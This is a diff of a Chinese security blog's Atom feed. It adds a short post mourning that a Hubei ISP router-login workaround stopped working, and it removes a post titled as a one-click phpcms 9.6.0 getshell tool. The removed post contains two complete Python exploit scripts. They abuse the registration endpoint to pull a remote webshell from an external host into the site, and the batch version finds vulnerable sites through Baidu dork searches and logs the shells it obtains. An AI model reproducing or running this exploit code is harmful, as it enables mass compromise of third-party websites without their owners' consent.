@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://hacktech.cn/"/>
-  <updated>2017-12-22T09:09:14.351Z</updated>
+  <updated>2017-12-24T03:02:23.505Z</updated>
   <id>http://hacktech.cn/</id>
   
   <author>
@@ -14,6 +14,37 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>湖北掌大协议于2017-12-24入土</title>
+    <link href="http://hacktech.cn/2017/12/24/Hubei-Exin-portal-was-dead.html"/>
+    <id>http://hacktech.cn/2017/12/24/Hubei-Exin-portal-was-dead.html</id>
+    <published>2017-12-24T02:50:03.000Z</published>
+    <updated>2017-12-24T03:02:23.505Z</updated>
+    
+    <content type="html"><![CDATA[<p>湖北e信的掌大协议死过很多次，不过是因为有人盯上了老陈，潜伏在了他的群，自己搞搞其实还是能用  </p>
+<p>今天却是死的不能再死，不知是不是永久，谨以此文纪念一下  </p>
+<a id="more"></a>
+<p>之前便是有人说马上掌大协议就失效了，但我对于这些传说，竟至于颇为怀疑。  </p>
+<p>我向来是不惮以最坏的恶意，来推测搞e信的那帮人的，然而我还不料，也不信竟会下劣凶残到这地步。况且始终可以无限时长的可使用路由器的掌大协议，更何至于无端就要失效呢？  </p>
+<p>然而今日证明是事实了，今早我起床就发现我自己的脚本登陆不上了，看了下错误输出，<a href="http://58.53.196.165:8080" target="_blank" rel="external">58.53.196.165:8080</a>打不开了，只有当你登陆e信后才能打开  </p>
+<p>可是我实在无话可说。我只觉得所住的并非人间。又回到了限时的e信，使我艰于呼吸视听，那里还能有什么言语？长歌当哭，是必须在痛定之后的。我已经出离愤怒了。我将e信这非人间的浓黑的悲凉；以我的最大哀痛显示于非人间，使它们快意于我的苦痛，就将这作为后死者的菲薄的祭品，奉献于逝者的灵前。  </p>
+<p>总之，在我的记忆上，这次可能就是永别了。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;湖北e信的掌大协议死过很多次，不过是因为有人盯上了老陈，潜伏在了他的群，自己搞搞其实还是能用  &lt;/p&gt;
+&lt;p&gt;今天却是死的不能再死，不知是不是永久，谨以此文纪念一下  &lt;/p&gt;
+    
+    </summary>
+    
+      <category term="life" scheme="http://hacktech.cn/categories/life/"/>
+    
+    
+      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
+    
+  </entry>
   
   <entry>
     <title>XMind8 Pro版激活序列码与补丁</title>
@@ -78,9 +109,9 @@
       <category term="life" scheme="http://hacktech.cn/categories/life/"/>
     
     
-      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
-    
       <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
+    
+      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
     
   </entry>
   
@@ -862,48 +893,6 @@
     
     
       <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>phpcms9-6-0 一键getshell工具</title>
-    <link href="http://hacktech.cn/2017/04/10/phpcms9-6-0-getshell-with-python.html"/>
-    <id>http://hacktech.cn/2017/04/10/phpcms9-6-0-getshell-with-python.html</id>
-    <published>2017-04-10T05:13:29.000Z</published>
-    <updated>2017-04-11T05:12:31.699Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
-<li>一键化<code>python 1.py http://xxx.com</code>,如果是批量直接运行py文件即可</li>
-</ul>
-<h2 id="待办"><a href="#待办" class="headerlink" title="待办"></a>待办</h2><ul>
-<li>[] 加入对有验证码phpcms网站的支持</li>
-<li>[] 加入批量(<strong>已完成</strong>)</li>
-</ul>
-<a id="more"></a>
-<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>依赖库的安装<code>pip install requests</code></p>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">----------------------</div><div class="line">Author : Akkuman</div><div class="line">Blog   : hacktech.cn</div><div class="line">----------------------</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</div><div class="line"></div><div class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</div><div class="line">        print(<span class="string">"[*]Usage   : Python 1.py http://xxx.com"</span>)</div><div class="line">        sys.exit()</div><div class="line">    host = sys.argv[<span class="number">1</span>]</div><div class="line">    url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></div><div class="line"></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"username"</span>: <span class="string">"dsakkfaffdssdudi"</span>,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line">        <span class="string">"email"</span>: <span class="string">"dsakkfddsjdi@qq.com"</span>,</div><div class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0</span></div><div class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg&gt;"</span>,</div><div class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</div><div class="line">        data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</div><div class="line">        data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</div><div class="line">        </div><div class="line">        htmlContent = requests.post(url, data=data)</div><div class="line"></div><div class="line">        successUrl = <span class="string">""</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</div><div class="line">            successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></div><div class="line">            print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">        <span class="keyword">if</span> successUrl == <span class="string">""</span>:</div><div class="line">            print(<span class="string">"[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n"</span>)</div><div class="line"></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        print(<span class="string">"Request Error"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
-<h2 id="批量"><a href="#批量" class="headerlink" title="批量"></a>批量</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">----------------------</div><div class="line">Author : Akkuman</div><div class="line">Blog   : hacktech.cn</div><div class="line">----------------------</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="comment"># from urlparse import unquote //Python2</span></div><div class="line"><span class="comment"># from urlparse import urlparse //Python2</span></div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</div><div class="line"></div><div class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseBaidu</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.baidu.com/s?wd='</span> + str(quote(keyword)) + <span class="string">'&amp;oq='</span> + str(quote(keyword)) + <span class="string">'&amp;ie=utf-8'</span> + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum*<span class="number">10</span>)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'div.c-container &gt; h3 &gt; a'</span>):</div><div class="line">                url = requests.get(a[<span class="string">'href'</span>], headers=headers).url</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveShell</span><span class="params">(shellUrl)</span>:</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">"webShell.txt"</span>,<span class="string">"a+"</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(<span class="string">"[*]%s\n"</span> % shellUrl)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"username"</span>: <span class="string">"akkumandsad"</span>,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line">        <span class="string">"email"</span>: <span class="string">"akkakkumafa@qq.com"</span>,</div><div class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0,普通一句话http://file.codecat.one/normalOneWord.txt</span></div><div class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt?.php#.jpg&gt;"</span>,</div><div class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> crawlUrl <span class="keyword">in</span> parseBaidu(<span class="string">"inurl:index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span>, <span class="number">10</span>):</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">if</span> crawlUrl:</div><div class="line">                rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</div><div class="line">                data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</div><div class="line">                data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</div><div class="line">                host = urlparse(crawlUrl).scheme + <span class="string">"://"</span> + urlparse(crawlUrl).hostname</div><div class="line">                url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></div><div class="line">                htmlContent = requests.post(url, data=data, timeout=<span class="number">10</span>)</div><div class="line">                successUrl = <span class="string">""</span></div><div class="line">                <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</div><div class="line">                    successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></div><div class="line">                    print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">                    saveShell(successUrl)</div><div class="line">                <span class="keyword">if</span> successUrl == <span class="string">""</span>:</div><div class="line">                    print(<span class="string">"[x]Failed : Failed to getshell."</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            print(<span class="string">"Request Error"</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
-<h2 id="测试图"><a href="#测试图" class="headerlink" title="测试图"></a>测试图</h2><h3 id="单个"><a href="#单个" class="headerlink" title="单个"></a>单个</h3><p><img src="https://ooo.0o0.ooo/2017/04/10/58eb6a69d5676.png" alt="TIM图片20170410191951.png"></p>
-<h3 id="批量-1"><a href="#批量-1" class="headerlink" title="批量"></a>批量</h3><p><img src="https://ooo.0o0.ooo/2017/04/11/58ec642d6578f.png" alt="TIM图片20170410225257.png"></p>
-<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="http://file.codecat.one/phpcms/" target="_blank" rel="external">代码下载地址</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;一键化&lt;code&gt;python 1.py http://xxx.com&lt;/code&gt;,如果是批量直接运行py文件即可&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&quot;待办&quot;&gt;&lt;a href=&quot;#待办&quot; class=&quot;headerlink&quot; title=&quot;待办&quot;&gt;&lt;/a&gt;待办&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;[] 加入对有验证码phpcms网站的支持&lt;/li&gt;
-&lt;li&gt;[] 加入批量(&lt;strong&gt;已完成&lt;/strong&gt;)&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-      <category term="Tools" scheme="http://hacktech.cn/categories/Tools/"/>
-    
-    
-      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
     
   </entry>
   
